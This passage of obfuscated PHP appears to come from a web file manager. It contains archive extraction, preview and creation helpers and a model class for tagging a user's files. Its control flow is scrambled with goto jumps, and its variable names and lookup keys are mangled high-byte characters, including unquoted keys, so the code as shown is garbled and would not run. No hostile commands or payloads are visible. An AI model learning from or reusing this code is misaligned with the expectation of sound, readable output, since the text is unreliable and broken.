(kodZipArchive::support($bÕö¡îÖ‘Ô[1925])) { return kodZipArchive::extract($DÆíª•ÑÑ¾, $eôÀˆ“ôÁé, $B¸¸‘³ÇÎó); } else { $aØİĞÒ¬ = new PclZip($DÆíª•ÑÑ¾); if ($E¸Ì°àæ != $bÕö¡îÖ‘Ô[1031]) { $dÏ¦ƒ‹ìÖ = $aØİĞÒ¬->extract(PCLZIP_OPT_PATH, $eôÀˆ“ôÁé, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $bÕö¡îÖ‘Ô[1926], PCLZIP_OPT_BY_NAME, $eİ’ãö®¯[$bÕö¡îÖ‘Ô[1921]], PCLZIP_OPT_REMOVE_PATH, $eÙ¥”ë‚¤¸, PCLZIP_OPT_REPLACE_NEWER); } else { $dÏ¦ƒ‹ìÖ = $aØİĞÒ¬->extract(PCLZIP_OPT_PATH, $eôÀˆ“ôÁé, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $bÕö¡îÖ‘Ô[1926], PCLZIP_OPT_REPLACE_NEWER); } return array($bÕö¡îÖ‘Ô[1032] => $dÏ¦ƒ‹ìÖ, $bÕö¡îÖ‘Ô[1034] => $aØİĞÒ¬->errorName(!0)); } } } return array($bÕö¡îÖ‘Ô[1032] => !1, $bÕö¡îÖ‘Ô[1034] => $bÕö¡îÖ‘Ô[1927]); goto f‚åÄ„¶¥Ü; fô°Š»ÙÁã: $bÕö¡îÖ‘Ô =& $_SERVER[”Ì÷ñ­î¸]; self::init(); $D›ÖĞ¼ë‘» = !empty($GLOBALS[$bÕö¡îÖ‘Ô[1049]]) ? $GLOBALS[$bÕö¡îÖ‘Ô[1049]] : get_path_ext($DÆíª•ÑÑ¾); goto b®ºš…©í¡; f‚åÄ„¶¥Ü: } static function fileIndex($fèÕö¢‰³, $d˜°ôµÍ, $cÅØ‹œšİ¥ = false) { goto fôíáÛé‹Ë; b°Ü²”§®ê: $AïÈŸÒŒÑ¨ = count($fèÕö¢‰³); for ($A¡‹¬ÅÕ…ù = 0; $A¡‹¬ÅÕ…ù < $AïÈŸÒŒÑ¨; $A¡‹¬ÅÕ…ù++) { if ($d˜°ôµÍ == $fèÕö¢‰³[$A¡‹¬ÅÕ…ù][$F”çÏÛ¬¬[1036]]) { $E§äƒÙÙô = $fèÕö¢‰³[$A¡‹¬ÅÕ…ù]; break; } } if (!$E§äƒÙÙô) { show_tips($F”çÏÛ¬¬[1928]); } goto dßâ‡í°áÔ; fôíáÛé‹Ë: $F”çÏÛ¬¬ =& $_SERVER[”Ì÷ñ­î¸]; self::init(); if (!is_array($fèÕö¢‰³)) { return !1; } goto b°Ü²”§®ê; dßâ‡í°áÔ: $d—±‘ƒŒŸ = $E§äƒÙÙô; if ($cÅØ‹œšİ¥) { $d—±‘ƒŒŸ = $E§äƒÙÙô[$cÅØ‹œšİ¥]; if ($E§äƒÙÙô[$F”çÏÛ¬¬[76]]) { $d—±‘ƒŒŸ = rtrim($d—±‘ƒŒŸ, $F”çÏÛ¬¬[8]) . $F”çÏÛ¬¬[8]; } } return $d—±‘ƒŒŸ; goto e³Ó¡«Ü¶; e³Ó¡«Ü¶: } static function extractZipFile($bÌÍ­áäš, $Fª‘¸®™Ó‘, $bÀŸÆš“„ = false) { goto b¹àéÊğˆ; b¹àéÊğˆ: $c¾áî¡Ñíí =& $_SERVER[”Ì÷ñ­î¸]; self::init(); $eô™ÈŠ‡§É = TEMP_FILES . hash_path($bÌÍ­áäš) . $c¾áî¡Ñíí[8]; goto C´³ççŞ¶ô; A§¿–¼©Àƒ: $f°˜¸×ÉÓ¦ = get_path_father($Fª‘¸®™Ó‘); if ($f°˜¸×ÉÓ¦ == $Fª‘¸®™Ó‘) { $f°˜¸×ÉÓ¦ = $c¾áî¡Ñíí[33]; } $cÃÛá©Õñ÷ = $b—·ŒÌî¥->extract(PCLZIP_OPT_PATH, $eô™ÈŠ‡§É, PCLZIP_CB_PRE_FILE_NAME, $c¾áî¡Ñíí[1926], PCLZIP_OPT_REMOVE_PATH, $f°˜¸×ÉÓ¦, PCLZIP_OPT_BY_NAME, $Fª‘¸®™Ó‘); goto c¼®÷¦“÷¼; C´³ççŞ¶ô: mk_dir($eô™ÈŠ‡§É); $dîĞÂçÖĞ† = $eô™ÈŠ‡§É . md5($bÌÍ­áäš . $Fª‘¸®™Ó‘); if ($bÀŸÆš“„) { $dîĞÂçÖĞ† = $eô™ÈŠ‡§É . $bÀŸÆš“„; } goto a¤¸ÙØÅšÁ; c¼®÷¦“÷¼: if (!file_exists($d…éœ“ ¶é)) { return !1; } @rename($d…éœ“ ¶é, $dîĞÂçÖĞ†); return $dîĞÂçÖĞ†; goto Aê¬‘º¤ƒÃ; a¤¸ÙØÅšÁ: if (file_exists($dîĞÂçÖĞ†)) { return $dîĞÂçÖĞ†; } $b—·ŒÌî¥ = new PclZip($bÌÍ­áäš); $d…éœ“ ¶é = unzip_filter_ext($eô™ÈŠ‡§É . get_path_this($Fª‘¸®™Ó‘)); goto A§¿–¼©Àƒ; Aê¬‘º¤ƒÃ: } static function filePreview($e©êé¨ÁŞ£, $AĞ‘“îùÛ, $bÃ„àÛ§ = false, $Bà÷Óˆ˜¿Ÿ = false) { goto AÆ„ÜŒªÌÑ; AÆ„ÜŒªÌÑ: $aæ±Ø´š–Ì =& $_SERVER[”Ì÷ñ­î¸]; self::init(); $eéÑ‰­ĞŸ´ = TEMP_FILES . hash_path($e©êé¨ÁŞ£) . $aæ±Ø´š–Ì[8]; goto Fßõ¾¥‡·; cªŠ„éÇğ÷: if (!file_exists($BĞ¾Ü¥¨„ø)) { del_dir($eéÑ‰­ĞŸ´); show_json($aæ±Ø´š–Ì[1931]); } IO::fileOut($BĞ¾Ü¥¨„ø, $bÃ„àÛ§, $EÊ…ƒºÛ¥ì); goto Eá³íœĞ¦ğ; bÄìÚß²š: $aİ†ªáß‹ = unzip_pre_name($aİ†ªáß‹); $EÊ…ƒºÛ¥ì = get_path_this($aİ†ªáß‹); $EÌï±×„Ñ¬ = unzip_filter_ext($eéÑ‰­ĞŸ´ . $EÊ…ƒºÛ¥ì); goto c²ç¿’…êÌ; Fßõ¾¥‡·: mk_dir($eéÑ‰­ĞŸ´); $BĞ¾Ü¥¨„ø = $eéÑ‰­ĞŸ´ . md5($e©êé¨ÁŞ£ . $AĞ‘“îùÛ . $Bà÷Óˆ˜¿Ÿ); $aİ†ªáß‹ = $aæ±Ø´š–Ì[33]; goto Døß›ƒ˜Šæ; c²ç¿’…êÌ: if (!$Bíì”¤å[$aæ±Ø´š–Ì[1032]]) { show_json($Bíì”¤å[$aæ±Ø´š–Ì[1034]], !1); } if (!file_exists($EÌï±×„Ñ¬)) { show_json($aæ±Ø´š–Ì[1930], !1); } @rename($EÌï±×„Ñ¬, $BĞ¾Ü¥¨„ø); goto cªŠ„éÇğ÷; Døß›ƒ˜Šæ: $Bíì”¤å = self::extract($e©êé¨ÁŞ£, $eéÑ‰­ĞŸ´, $AĞ‘“îùÛ, $aİ†ªáß‹); if (is_array($aİ†ªáß‹)) { show_json($aæ±Ø´š–Ì[1929], !1); } if (file_exists($BĞ¾Ü¥¨„ø)) { IO::fileOut($BĞ¾Ü¥¨„ø, $bÃ„àÛ§, get_path_this($aİ†ªáß‹)); return; } goto bÄìÚß²š; Eá³íœĞ¦ğ: } static function create($a¾Æ§‰Õ˜±, $fËÕËî•‡) { $e×ÂÈµõ¨æ =& $_SERVER[”Ì÷ñ­î¸]; self::init(); $C¼Ñ©©—²¤ = get_path_ext($a¾Æ§‰Õ˜±); $A‡Áİ†î = !1; if (self::checkIfType($C¼Ñ©©—²¤, $e×ÂÈµõ¨æ[301])) { if (kodZipArchive::support($e×ÂÈµõ¨æ[1010])) { return kodZipArchive::create($a¾Æ§‰Õ˜±, $fËÕËî•‡); } $añº»óô¸› = new PclZip($a¾Æ§‰Õ˜±); foreach ($fËÕËî•‡ as $D ­Úè™ç => $B¥‘´˜¿Ì—) { $B¥‘´˜¿Ì— = str_replace($e×ÂÈµõ¨æ[467], $e×ÂÈµõ¨æ[8], $B¥‘´˜¿Ì—); $aÓëìÓ–Æ§ = Kodio::clear(get_path_father($B¥‘´˜¿Ì—)); if ($D ­Úè™ç == 0) { $A‡Áİ†î = $añº»óô¸›->create($B¥‘´˜¿Ì—, PCLZIP_OPT_REMOVE_PATH, $aÓëìÓ–Æ§, PCLZIP_CB_PRE_FILE_NAME, $e×ÂÈµõ¨æ[1932]); continue; } $A‡Áİ†î = $añº»óô¸›->add($B¥‘´˜¿Ì—, PCLZIP_OPT_REMOVE_PATH, $aÓëìÓ–Æ§, PCLZIP_CB_PRE_FILE_NAME, $e×ÂÈµõ¨æ[1932]); } } else { if (self::checkIfType($C¼Ñ©©—²¤, $e×ÂÈµõ¨æ[1903])) { foreach ($fËÕËî•‡ as $D ­Úè™ç => $B¥‘´˜¿Ì—) { $B¥‘´˜¿Ì— = str_replace($e×ÂÈµõ¨æ[467], $e×ÂÈµõ¨æ[8], $B¥‘´˜¿Ì—); $aÓëìÓ–Æ§ = Kodio::clear(get_path_father($B¥‘´˜¿Ì—)); if ($D ­Úè™ç == 0) { $A‡Áİ†î = PclTarCreate($a¾Æ§‰Õ˜±, array($B¥‘´˜¿Ì—), $C¼Ñ©©—²¤, null, $aÓëìÓ–Æ§); continue; } $A‡Áİ†î = PclTarAddList($a¾Æ§‰Õ˜±, array($B¥‘´˜¿Ì—), $e×ÂÈµõ¨æ[33], $aÓëìÓ–Æ§, $C¼Ñ©©—²¤); } } } return $A‡Áİ†î; } } goto D†™Øìæ…; F¢ß·ƒØË: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\x66\141\166"; protected function cacheFunctionAlias($Eˆ¾Õã»‰¿) { $a¨ŸÃôëŞ =& $_SERVER[”Ì÷ñ­î¸]; return array($a¨ŸÃôëŞ[2490] => array(USER_ID, $a¨ŸÃôëŞ[2545])); } protected function listData() { $eáâÁ‡ÈíÙ =& $_SERVER[”Ì÷ñ­î¸]; $A¼‡Ó–ã–ó = array($eáâÁ‡ÈíÙ[1430] => USER_ID, $eáâÁ‡ÈíÙ[436] => array($eáâÁ‡ÈíÙ[2546], 0)); $EÑ¢äçë¯ = $eáâÁ‡ÈíÙ[2547]; $B„Ö¨ˆÓì = $eáâÁ‡ÈíÙ[2548]; $ağŠ¨ÂŸ¸¢ = $this->field($EÑ¢äçë¯)->where($A¼‡Ó–ã–ó)->order($B„Ö¨ˆÓì)->select(); return $ağŠ¨ÂŸ¸¢ ? $ağŠ¨ÂŸ¸¢ : array(); } protected function listByTag($dŒÅÀÜóÔ) { } protected function addToTag($Dê—´Ë¡×Î, $Eáâ‰…×¼) { $d¯•ÙĞ‚îƒ =& $_SERVER[”Ì÷ñ­î¸]; if (!Model($d¯•ÙĞ‚îƒ[2316])->listData($Eáâ‰…×¼) || !Model($d¯•ÙĞ‚îƒ[754])->pathInfo($Dê—´Ë¡×Î)) { return !1; } $AìÛ÷éŸ¶ = array($d¯•ÙĞ‚îƒ[1430] => USER_ID, $d¯•ÙĞ‚îƒ[436] => $Eáâ‰…×¼, $d¯•ÙĞ‚îƒ[387] => $Dê—´Ë¡×Î, $d¯•ÙĞ‚îƒ[388] => $d¯•ÙĞ‚îƒ[382], $d¯•ÙĞ‚îƒ[386] => $d¯•ÙĞ‚îƒ[33], $d¯•ÙĞ‚îƒ[2110] => 0); if ($this->where($AìÛ÷éŸ¶)->find()) { return !1; } return $this->add($AìÛ÷éŸ¶); } protected function removeFromTag($EÂ‘éğ™›, $Eˆ…ƒÖ†¥«) { $EÁíÛ«àë =& $_SERVER[”Ì÷ñ­î¸]; if (!Model($EÁíÛ«àë[2316])->listData($Eˆ…ƒÖ†¥«)) { return !1; } if (is_array($EÂ‘éğ™›)) { $EÂ‘éğ™› = array($EÁíÛ«àë[7], $EÂ‘éğ™›); } $FØ¥„ìæï = array($EÁíÛ«àë[1430] => USER_ID, $EÁíÛ«àë[436] => $Eˆ…ƒÖ†¥«, $EÁíÛ«àë[388] => $EÁíÛ«àë[382], $EÁíÛ«àë[387] => $EÂ‘éğ™›); return $this->where($FØ¥„ìæï)->delete(); } protected function removeByTag($cöœùÍº§) { $FÄ¶‡İâõš =& $_SERVER[”Ì÷ñ­î¸]; if (!$cöœùÍº§) { return !1; } $d‘ö­™ó¹ = array($FÄ¶‡İâõš[1430] => USER_ID, $FÄ¶‡İâõš[436] => $cöœùÍº§); return $this->where($d‘ö­™ó¹)->delete(); } protected function removeBySource($b¼Ë¯Ç‘†Á) { $FâÕºŸíÜô =& $_SERVER[”Ì÷ñ­î¸]; $E­ˆ¯öÆÇÊ = array($FâÕºŸíÜô[1430] => USER_ID, $FâÕºŸíÜô[387] => $b¼Ë¯Ç‘†Á, $FâÕºŸíÜô[436] => array($FâÕºŸíÜô[930], 0)); return $this->where($E­ˆ¯öÆÇÊ)->delete(); } }